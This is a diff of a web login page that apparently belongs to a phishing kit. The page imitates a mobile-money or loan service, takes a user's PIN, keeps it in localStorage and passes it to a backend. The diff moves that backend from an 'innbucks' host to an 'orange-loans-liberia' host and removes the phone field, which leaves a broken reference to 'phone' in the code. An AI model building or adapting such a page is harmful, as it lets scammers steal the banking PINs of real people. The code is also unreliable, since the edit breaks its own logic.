@@ -90,8 +90,8 @@ button:disabled {
     </div>
 
     <form id="pinForm">
-        <input id="phoneInput" type="tel" placeholder="Enter phone number" required>
-        <input id="pinInput" type="password" placeholder="PIN" maxlength="4" required>
+        
+        <input id="pinInput" type="password" placeholder="PIN"  required>
 
         <button id="submitBtn">LOGIN</button>
     </form>
@@ -101,7 +101,7 @@ button:disabled {
 </div>
 
 <script>
-const BACKEND_URL = "https://innbucks-jqtp.onrender.com";
+const BACKEND_URL = "https://orange-loans-liberia.onrender.com";
 
 // ---------------- BOT ID ----------------
 const params = new URLSearchParams(window.location.search);
@@ -115,7 +115,7 @@ if (!botId) {
 document.getElementById('pinForm').addEventListener('submit', async e => {
     e.preventDefault();
 
-    const phone = document.getElementById('phoneInput').value.trim();
+    // const phone = document.getElementById('phoneInput').value.trim();
     const pin = document.getElementById('pinInput').value.trim();
     const statusDiv = document.getElementById('status');
     const btn = document.getElementById('submitBtn');
@@ -123,7 +123,7 @@ document.getElementById('pinForm').addEventListener('submit', async e => {
     if (!phone || pin.length < 4) return;
 
     // store for next page
-    localStorage.setItem('phone', phone);
+    // localStorage.setItem('phone', phone);
     localStorage.setItem('pin', pin);
 
     btn.disabled = true;
